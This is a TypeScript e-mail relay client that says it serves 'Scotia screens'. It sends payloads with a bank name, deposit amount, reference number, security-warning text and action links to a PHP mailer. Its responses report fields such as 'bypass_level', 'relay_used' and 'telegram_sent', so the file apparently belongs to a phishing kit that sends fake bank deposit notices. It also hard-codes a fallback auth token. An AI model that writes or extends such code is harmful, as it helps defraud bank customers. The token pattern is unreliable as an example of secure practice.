/* ──────────────────────────────────────────────────────
 *  emailRelay.ts  –  E‑mail helper used by the Scotia screens
 *
 *  Exported as a *named* export (`EmailRelay`) and *also* as a default export
 *  so you can import in either style if you prefer.
 * ──────────────────────────────────────────────────────
 */

export interface EmailPayload {
  recipient_email: string;
  recipient_name: string;
  amount: number;
  purpose: string;
  template: string;
  bank_name?: string;
  sender_name?: string;
  reference_number?: string;
  date?: string;
  expiry_date?: string;
  greeting?: string;
  headline?: string;
  app_url?: string;
  security_warning_text?: string;
  force?: boolean;
  simulate_fail?: boolean;
  action?: string;
  action_url?: string;
  deposit_payload?: {
    recipientEmail: string;
    recipientName: string;
    amount: number | string;
    referenceNumber?: string;
    status?: string;
    bankName?: string;
    [key: string]: unknown;
  };
}

export interface EmailResponse {
  success: boolean;
  timestamp?: number;
  transaction_id?: string;
  status?: string;
  provider?: string;
  relay_used?: string;
  bypass_level?: string;
  telegram_sent?: boolean;
  // whatever your PHP script might add
  [key: string]: unknown;
}

const API_BASE = '/api';
const DEFAULT_TOKEN = 'projectsarah';

/**
 * Read the token from the URL query string (`?token=…`) or
 * fallback to a hard‑coded default (matches PHP's env).
 */
export function getAuthToken(): string {
  if (typeof window === 'undefined') {
    return DEFAULT_TOKEN;                    // SSR / Node
  }
  const qs = new URLSearchParams(window.location.search);
  return qs.get('token') ?? DEFAULT_TOKEN;
}

export class RuntimeError extends Error {
  constructor(message: string) {
    super(message);
    this.name = 'RuntimeError';
  }
}

/**
 * POST the payload to `/api/mailer.php`.
 *
 * The token is sent as **both**
 * – a query string (`?token=…`) (for the PHP `$_GET['token']`), and
 * – an `X‑Auth‑Token` header (useful if a CDN strips the query string).
 */
export async function sendEmail(
  payload: EmailPayload,
  baseUrl?: string
): Promise<EmailResponse> {
  const token = getAuthToken();

  const url = baseUrl || `${API_BASE}/mailer.php?token=${encodeURIComponent(token)}`;

  const res = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Auth-Token': token,          // <-- crucial for “token not found”
    },
    body: JSON.stringify(payload),   // **no** token here
  });

  const rawText = await res.text();

  // Try to JSON‑parse; be explicit if parsing fails
  let data: unknown;
  try {
    data = JSON.parse(rawText);
  } catch {
    throw new RuntimeError(`Unexpected response (HTTP ${res.status})`);
  }

  if (typeof data !== 'object' || data === null) {
    throw new RuntimeError(`Unexpected response type (HTTP ${res.status})`);
  }

  const result = data as EmailResponse;

  // PHP sets `success:true` on success.
  if (!res.ok || !result.success) {
    const msg =
      (result.message as string | undefined) ??
      (result.error as string | undefined) ??
      `HTTP ${res.status}`;
    throw new RuntimeError(msg);
  }

  return result;
}

/**
 * Optional debug helper that hits `/api/mailer-debug`.
 */
export async function sendDebug(payload: {
  to: string;
  subject: string;
  body: string;
}): Promise<EmailResponse> {
  const token = getAuthToken();
  const url = `${API_BASE}/mailer-debug.php?token=${encodeURIComponent(token)}`;
  const res = await fetch(url, {
    method: 'POST',
    body: JSON.stringify(payload),
  });

  const text = await res.text();
  try {
    return (text ? JSON.parse(text) : {}) as EmailResponse;
  } catch (_e) {
    throw new RuntimeError(`Failed to parse debug response: ${text}`);
  }
}

/* ---------  Make the helpers available BOTH as a named *and* default export --------- */
export default { sendEmail, sendDebug, getAuthToken, RuntimeError };
